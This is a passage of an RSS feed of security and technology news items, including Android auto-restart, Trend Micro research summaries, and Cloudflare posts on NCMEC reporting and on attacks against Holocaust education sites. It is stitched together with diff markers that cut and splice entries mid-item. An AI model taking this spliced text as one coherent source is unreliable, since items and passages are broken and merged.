device, which will make your personal data harder to extract. It's coming as part of a Google Play Services update, though, so there's nothing you can do to speed along the process.&lt;/p&gt;
 &lt;p&gt;Google is preparing to release a &lt;a href="https://support.google.com/product-documentation/answer/14343500"&gt;new update to Play Services&lt;/a&gt; (v25.14), which brings a raft of tweaks and improvements. First &lt;a href="https://9to5google.com/2025/04/14/android-auto-restart-security/"&gt;spotted&lt;/a&gt; by 9to5Google, the update was officially released on April 14, but as with all Play Services updates, it could take a week or more to reach all devices. When 25.14 arrives, Android devices will see a few minor improvements, including prettier settings screens, improved connection with cars and watches, and content previews when using Quick Share.&lt;/p&gt;
 &lt;p&gt;Most importantly, Play Services 25.14 adds a feature that Google describes thusly: "With this feature, your device automatically restarts if locked for 3 consecutive days."&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/#comments"&gt;Comments&lt;/a&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/</guid><category>Google</category><category>Tech</category><category>android</category><category>google</category><category>security</category><category>smartphones</category></item><item><title>What Kind of Business Should I Start? 5 Factors to Consider</title><link>https://www.techrepublic.com/resource-library/guide/5-factors-for-starting-business/</link><description>New entrepreneurs can use this guide to boost their chances of success when choosing a type of business. Constantly Updated — The download contains the latest and most accurate details. Enhance Your Knowledge — This nine-page PDF looks at budgeting, funding, market demand, and more. Expert Guidance — Written by Madeline Clarke through 20 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/5-factors-for-starting-business/</guid><category>Additional Resources</category><category>Innovation</category><category>Startups</category></item><item><title>ZDI-23-1527 and ZDI-23-1528: The Potential Impact of Overly Permissive SAS Tokens on PC Manager Supply Chains</title><link>https://www.trendmicro.com/en_us/research/25/d/zdi-23-1527-and-zdi-23-1528-the-potential-impact-of-overly-permi.html</link><description>In ZDI-23-1527 and ZDI-23-1528 we uncover two possible scenarios where attackers could have compromised the Microsoft PC Manager supply chain.</description><guid isPermaLink="false">urn:uuid:b9fcbbdb-39d3-9cad-5e2a-b27c04786f95</guid><category>Trend Micro Research : Cyber Risk</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Research</category></item><item><title>Strengthen Security with Cyber Risk Advisory</title><link>https://www.trendmicro.com/en_us/research/25/d/cyber-risk-advisory.html</link><description>In today’s fast-paced digital world, cyber threats are constantly evolving. Attackers are leveraging advanced techniques and artificial intelligence (AI) to exploit vulnerabilities, leaving organizations vulnerable to breaches and disruptions. To combat these challenges, organizations must stay vigilant and implement more proactive cybersecurity measures. This is where our Cyber Risk Advisory service, powered by the Trend Vision One™ Cyber Risk Exposure Management (CREM) solution, step in to provide a strategic edge.</description><guid isPermaLink="false">urn:uuid:690d8095-8768-1c08-ee5c-3f4b35649b5b</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Network</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Data center</category></item><item><title>Top 10 for LLM &amp; Gen AI Project Ranked by OWASP</title><link>https://www.trendmicro.com/en_us/research/25/d/top-llm-gen-ai.html</link><description>Trend Micro has become a Gold sponsor of the OWASP Top 10 for LLM and Gen AI Project, merging cybersecurity expertise with OWASP's collaborative efforts to address emerging AI security risks. This partnership underscores Trend Micro's unwavering commitment to advancing AI security, ensuring a secure foundation for the transformative power of AI.</description><guid isPermaLink="false">urn:uuid:94875dc5-8bf7-814c-44bb-6c3a40d98fdd</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>BPFDoor’s Hidden Controller Used Against Asia, Middle East Targets</title><link>https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html</link><description>A controller linked to BPF backdoor can open a reverse shell, enabling deeper infiltration into compromised networks. Recent attacks have been observed targeting the telecommunications, finance, and retail sectors across South Korea, Hong Kong, Myanmar, Malaysia, and Egypt.</description><guid isPermaLink="false">urn:uuid:93d61ced-9166-ec9a-329c-5cff00970092</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>How we simplified NCMEC reporting with Cloudflare Workflows</title><link>https://blog.cloudflare.com/simplifying-ncmec-reporting-with-cloudflare-workflows/</link><description>We transitioned to Cloudflare Workflows to manage complex, multi-step processes more efficiently. This shift replaced our National Center for Missing &amp; Exploited Children (NCMEC) reporting system.</description><content:encoded>&lt;p&gt;Cloudflare plays a significant role in supporting the Internet’s infrastructure. &lt;a href="https://w3techs.com/technologies/history_overview/proxy/all/q"&gt;&lt;u&gt;As a reverse proxy by approximately 20% of all websites&lt;/u&gt;&lt;/a&gt;, we sit directly in the request path between users and the origin, helping to improve performance, security, and reliability at scale. Beyond that, our global network powers services like &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/cdn/"&gt;&lt;u&gt;delivery&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://workers.cloudflare.com/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.cloudflare.com/en-gb/developer-platform/products/r2/"&gt;&lt;u&gt;R2&lt;/u&gt;&lt;/a&gt; — making Cloudflare not just a passive intermediary, but an active platform for delivering and hosting content across the Internet.&lt;/p&gt;&lt;p&gt;Since Cloudflare’s launch in 2010, we have collaborated with the National Center for Missing and Exploited Children (&lt;a href="https://www.missingkids.org/home"&gt;&lt;u&gt;NCMEC&lt;/u&gt;&lt;/a&gt;), a US-based clearinghouse for reporting child sexual abuse material (CSAM), and are committed to doing what we can to support identification and removal of CSAM content.&lt;/p&gt;&lt;p&gt;Members of the public, &lt;a href="https://blog.cloudflare.com/cloudflares-response-to-csam-online/"&gt;&lt;u&gt;customers, and trusted organizations can submit reports&lt;/u&gt;&lt;/a&gt; of abuse observed on Cloudflare’s network. A minority of these reports relate to CSAM, which are triaged with the highest priority by Cloudflare’s Trust &amp;amp; Safety team. We will also forward details of the report, along with relevant files (where applicable) and supplemental information to NCMEC.&lt;/p&gt;&lt;p&gt;The process to generate and submit reports to NCMEC involves multiple steps, dependencies, and error handling, which quickly became complex under our original queue-based architecture. In this blog post, we discuss how Cloudflare &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Workflows&lt;/u&gt;&lt;/a&gt; helped streamline this process and simplify the code behind it.&lt;/p&gt;
@@ -18309,61 +18568,7 @@ broadcast 203.0.113.255 dev lo proto kernel scope link src 203.0.113.0&lt;/code&
         &lt;p&gt;We are excited about the launch of the Global CBPR certifications, expected later in 2025, and we are proud that on this Data Privacy Day, we can yet again demonstrate our commitment to universally held principles for protecting the privacy of personal data.&lt;/p&gt;&lt;p&gt;You can find more about the Global CBPR System, the Global PRP, download a full copy of the requirements, and keep up to date with related news at &lt;a href="https://www.globalcbpr.org/"&gt;&lt;u&gt;globalcbpr.org&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;For the latest information about our certifications, please visit our &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/"&gt;&lt;u&gt;Trust Hub&lt;/u&gt;&lt;/a&gt;. Customers can also find out how to download a copy of Cloudflare’s certifications and reports from the &lt;a href="https://developers.cloudflare.com/fundamentals/get-started/basic-tasks/access-compliance-docs/"&gt;&lt;u&gt;Cloudflare dashboard&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
           &lt;figure&gt;
           &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/36LV7CkbF5b5IuXN4ZVXZC/77775c3e2791418d87c36d46e755fbbc/image2.png" /&gt;
-          &lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">63yGQGTniOUOFneFLwTb7a</guid><category>Certification</category><category>Privacy</category><category>Compliance</category><category>Security</category><category>Policy &amp; Legal</category></item><item><title>Cloudflare thwarts over 47 million cyberthreats against Jewish and Holocaust educational websites</title><link>https://blog.cloudflare.com/cloudflare-thwarts-over-47-million-cyberthreats-against-jewish-and-holocaust/</link><description>January 27 marks the International Holocaust Remembrance Day — a solemn occasion to honor the memory of the six million Jews who perished in the Holocaust, along with countless others who fell victim</description><content:encoded>&lt;p&gt;&lt;/p&gt;&lt;p&gt;January 27 marks the &lt;a href="https://en.wikipedia.org/wiki/International_Holocaust_Remembrance_Day"&gt;&lt;u&gt;International Holocaust Remembrance Day&lt;/u&gt;&lt;/a&gt; — a solemn occasion to honor the memory of the six million Jews who perished in the Holocaust, along with countless others who fell victim to the Nazi regime's campaign of hatred and intolerance. This tragic chapter in human history serves as a stark reminder of the catastrophic consequences of prejudice and extremism. &lt;/p&gt;&lt;p&gt;The United Nations General Assembly designated January 27 — the anniversary of the liberation of &lt;a href="https://en.wikipedia.org/wiki/Auschwitz_concentration_camp"&gt;&lt;u&gt;Auschwitz-Birkenau&lt;/u&gt;&lt;/a&gt; —  as International Holocaust Remembrance Day. This year, we commemorate the 80th anniversary of the liberation of this infamous extermination camp.&lt;/p&gt;&lt;p&gt;As the world reflects on this dark period, a troubling resurgence of antisemitism underscores the importance of vigilance. This growing hatred has spilled into the digital realm, with cyberattacks increasingly targeting Jewish and Holocaust remembrance and educational websites — spaces dedicated to preserving historical truth and fostering awareness.&lt;/p&gt;&lt;p&gt;For this reason, here at Cloudflare, we began to publish annual reports covering cyberattacks that target these organizations. These cyberattacks include &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS attacks&lt;/u&gt;&lt;/a&gt; as well as &lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;bot&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-web-application-security/"&gt;&lt;u&gt;application attacks&lt;/u&gt;&lt;/a&gt;. The insights and trends are based on websites protected by Cloudflare. This is our fourth report, and you can view our previous Holocaust Remembrance Day blogs &lt;a href="https://blog.cloudflare.com/tag/holocaust/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;
-          &lt;div&gt;
-            &lt;h2&gt;Project Galileo&lt;/h2&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#project-galileo"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-          &lt;p&gt;At Cloudflare, we are proud to support these vital organizations through &lt;a href="https://www.cloudflare.com/en-gb/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, an initiative providing free security protections to vulnerable groups worldwide. If you or your organization could benefit from this program, consider applying today to help protect these essential platforms and the invaluable work they do.&lt;/p&gt;
-          &lt;figure&gt;
-          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3tyusSSEjith2HMfONmpfZ/d7a47e9faa2b0003ae4e3c2ab1c01722/BLOG-2659_2.png" /&gt;
-          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Project Galileo overview. Source: &lt;/i&gt;&lt;/sup&gt;&lt;a href="https://cf-assets.www.cloudflare.com/slt3lc6tev37/7bEraZE4BmpaCFfYYHxbaU/20dda9014ac14793e61daaff0783eee5/2024_Cloudflare_Impact_Report.pdf"&gt;&lt;sup&gt;&lt;i&gt;&lt;u&gt;Cloudflare 2024 Impact Report&lt;/u&gt;&lt;/i&gt;&lt;/sup&gt;&lt;/a&gt;&lt;sup&gt;&lt;i&gt;&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;One of the organizations that we protect through Project Galileo is &lt;a href="https://muzeon.ro/en/"&gt;&lt;u&gt;Muzeon&lt;/u&gt;&lt;/a&gt;, a museum dedicated to preserving Jewish history in Cluj-Napoca, Romania. Muzeon faced significant cyberattacks that impacted their website’s performance and hindered operations before using Cloudflare.&lt;/p&gt;&lt;p&gt;As part of Project Galileo, Muzeon implemented Cloudflare's &lt;a href="https://www.cloudflare.com/en-gb/ddos/"&gt;&lt;u&gt;DDoS mitigation&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/waf/"&gt;&lt;u&gt;Web Application Firewall (WAF)&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/application-services/products/dns/"&gt;&lt;u&gt;Managed DNS&lt;/u&gt;&lt;/a&gt;, and other services. These measures drastically reduced the attacks and allowed Muzeon to focus on its important mission of storytelling and preserving cultural heritage. &lt;/p&gt;&lt;p&gt;Cloudflare’s solutions not only protected their digital infrastructure but also freed up time for Muzeon to expand its interactive exhibits, ensuring they could continue sharing their essential work globally. You can read more about this case study &lt;a href="https://www.cloudflare.com/en-gb/case-studies/muzeon/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;
-          &lt;div&gt;
-            &lt;h2&gt;Significant rise in antisemitism around the world&lt;/h2&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#significant-rise-in-antisemitism-around-the-world"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-          &lt;p&gt;Following the October 7, 2023, &lt;a href="https://en.wikipedia.org/wiki/October_7_Hamas-led_attack_on_Israel"&gt;&lt;u&gt;Hamas-led attack&lt;/u&gt;&lt;/a&gt; on Israel, there has been a &lt;a href="https://en.wikipedia.org/wiki/Antisemitism_during_the_Israel%E2%80%93Hamas_war"&gt;&lt;u&gt;surge in global antisemitic incidents&lt;/u&gt;&lt;/a&gt;. In the &lt;a href="https://www.adl.org/resources/press-release/over-10000-antisemitic-incidents-recorded-us-oct-7-2023-according-adl"&gt;&lt;u&gt;U.S. alone&lt;/u&gt;&lt;/a&gt; there have been more than 10,000 antisemitic incidents from October 7, 2023 to September 24, 2024, representing an over 200-percent increase compared to the incidents reported during the same period a year before. As we’ve seen, the digital world is often a mirror to the real world. As a result, it is not surprising that websites dedicated to sharing information about the Holocaust, as well as Jewish memorial and education platforms, are now increasingly being targeted online. &lt;/p&gt;
-          &lt;div&gt;
-            &lt;h2&gt;Cyberattacks against Jewish and Holocaust educational websites &lt;/h2&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-against-jewish-and-holocaust-educational-websites"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-          &lt;p&gt;For the years 2020, 2021, and 2022, the number of cyberthreats targeting Holocaust and Jewish educational and memorial websites protected by Cloudflare was, on average, 736,339 malicious HTTP requests annually.&lt;/p&gt;&lt;p&gt;After the October 7 Hamas-led attack, cyberattacks skyrocketed. In 2023, the amount of blocked HTTP requests surged by 872% to 35.7 million compared to 2022. Most of these cyberattacks occurred after October 7, 2023. &lt;/p&gt;&lt;p&gt;In 2024, the number of blocked HTTP requests exceeded 47 million — representing a 30% increase compared to 2023. Over 3 out of every 100 HTTP requests towards Holocaust and Jewish memorial and education websites protected by Cloudflare were malicious and blocked. &lt;/p&gt;
-          &lt;figure&gt;
-          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6p2NxGtyK3jDccp2G0MMvF/c7777304675f36f8cbe301f92a6dc5ec/BLOG-2659_3.png" /&gt;
-          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by year&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
-          &lt;div&gt;
-            &lt;h3&gt;Cyberattacks by quarter&lt;/h3&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-quarter"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-        &lt;p&gt;In the fourth quarter of 2023, the volume of malicious requests exceeded 27 million. Throughout the first three quarters of 2024, we saw a gradual decrease in the quantity of malicious requests. But in the fourth quarter of 2024, cyberattacks spiked by 33%, to 36 million requests, following the one-year anniversary of the October 7 assault.&lt;/p&gt;
-          &lt;figure&gt;
-          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1YFVY3jTbMYsgbenBdor1P/6634fdf6edce5a5f3d44f34fdf017b3d/BLOG-2659_4.png" /&gt;
-          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by quarter&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
-          &lt;div&gt;
-            &lt;h3&gt;Cyberattacks by month&lt;/h3&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-month"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-        &lt;p&gt;Breaking down the quarters into months, we can see an initial peak in October 2023 after the October 7 Hamas-led attack. The volume of cyberattacks remained elevated during November and December 2023.&lt;/p&gt;&lt;p&gt;Afterward, as we entered 2024, the quantity and percentage of cyberattacks against these websites significantly decreased. In November, over a third (34%) of all requests towards these websites were blocked, with over 36 million requests blocked that month alone.&lt;/p&gt;
-          &lt;figure&gt;
-          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5JGzGCm49GBBZMYfriSTpl/1f47b7b90bb5607461216fd2788c2f34/BLOG-2659_5.png" /&gt;
-          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by month&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
-          &lt;div&gt;
-            &lt;h2&gt;Helping build a safer Internet and a better world&lt;/h2&gt;
-            &lt;a href="https://blog.cloudflare.com/tag/security/rss#helping-build-a-safer-internet-and-a-better-world"&gt;
-              
-            &lt;/a&gt;
-          &lt;/div&gt;
-          &lt;p&gt;On the International Holocaust Remembrance Day, we reflect on the importance of standing against both antisemitism and cyber threats — issues that have escalated since the October 7, 2023, Hamas-led attack. &lt;/p&gt;&lt;p&gt;At Cloudflare, we are unwavering in our commitment to create a safer, more inclusive Internet. The rise in antisemitism has made it even more critical to protect educational websites and communities from harmful cyber attacks. We invite everyone to join us in this fight. Even with our &lt;a href="https://www.cloudflare.com/en-gb/plans/"&gt;&lt;u&gt;free plan&lt;/u&gt;&lt;/a&gt;, we offer strong security and performance, ensuring that vital resources and websites remain safe and accessible. By working together, we can protect the lessons of history and foster a more secure digital world for all.&lt;/p&gt;</content:encoded><guid isPermaLink="false">4tycw0mGr6bpp3AbV17wEK</guid><category>DDoS</category><category>DDoS Reports</category><category>Attacks</category><category>Security</category><category>Network Services</category></item><item><title>Privacy-Preserving Federated Learning – Future Collaboration and Continued Research</title><link>https://www.nist.gov/blogs/cybersecurity-insights/privacy-preserving-federated-learning-future-collaboration-and</link><description>This post is the final blog in a series on privacy-preserving federated learning . The series is a collaboration between NIST and the UK government’s Responsible Technology Adoption Unit (RTA), previously known as the Centre for Data Ethics and Innovation. Learn more and read all the posts published to date at NIST’s Privacy Engineering Collaboration Space or RTA’s blog . Reflections and Wider Considerations This is the final post in the series that began with reflections and learnings from the first US-UK collaboration working with Privacy Enhancing Technologies (PETs). Since the PETs Prize</description><guid isPermaLink="false">https://www.nist.gov/node/1873306</guid></item><item><title>Scaling Dynamic Application Security Testing (DAST)</title><link>https://msrc.microsoft.com/blog/2025/01/scaling-dynamic-application-security-testing-dast/</link><description>Introduction Microsoft engineering teams use the Security Development Lifecycle to ensure our products are built in alignment with Microsoft’s Secure Future Initiative security principles: Secure by Design, Secure by Default, and Secure Operations.
+          &lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">63yGQGTniOUOFneFLwTb7a</guid><category>Certification</category><category>Privacy</category><category>Compliance</category><category>Security</category><category>Policy &amp; Legal</category></item><item><title>Privacy-Preserving Federated Learning – Future Collaboration and Continued Research</title><link>https://www.nist.gov/blogs/cybersecurity-insights/privacy-preserving-federated-learning-future-collaboration-and</link><description>This post is the final blog in a series on privacy-preserving federated learning . The series is a collaboration between NIST and the UK government’s Responsible Technology Adoption Unit (RTA), previously known as the Centre for Data Ethics and Innovation. Learn more and read all the posts published to date at NIST’s Privacy Engineering Collaboration Space or RTA’s blog . Reflections and Wider Considerations This is the final post in the series that began with reflections and learnings from the first US-UK collaboration working with Privacy Enhancing Technologies (PETs). Since the PETs Prize</description><guid isPermaLink="false">https://www.nist.gov/node/1873306</guid></item><item><title>Scaling Dynamic Application Security Testing (DAST)</title><link>https://msrc.microsoft.com/blog/2025/01/scaling-dynamic-application-security-testing-dast/</link><description>Introduction Microsoft engineering teams use the Security Development Lifecycle to ensure our products are built in alignment with Microsoft’s Secure Future Initiative security principles: Secure by Design, Secure by Default, and Secure Operations.
 A key component of the Security Development Lifecycle is security testing, which aims to discover and mitigate security vulnerabilities before adversaries can exploit them.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/01/scaling-dynamic-application-security-testing-dast/</guid></item><item><title>What It Takes to Be Your Organisation’s DPO or Data Privacy Lead</title><link>https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead</link><description>&lt;p&gt;‘GDPR’ has become a familiar term. We recognise the visible and consumer-facing aspects of the General Data Protection Regulation in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example. What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance: So, how sure are you that your organisation is fully compliant with the relevant data protection legislation? In this blog ‘Once compliant’ does not mean ‘still compliant’ &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead"&gt;What It Takes to Be Your Organisation’s DPO or Data Privacy Lead&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;‘GDPR’ has become a familiar term.&lt;/p&gt;
 
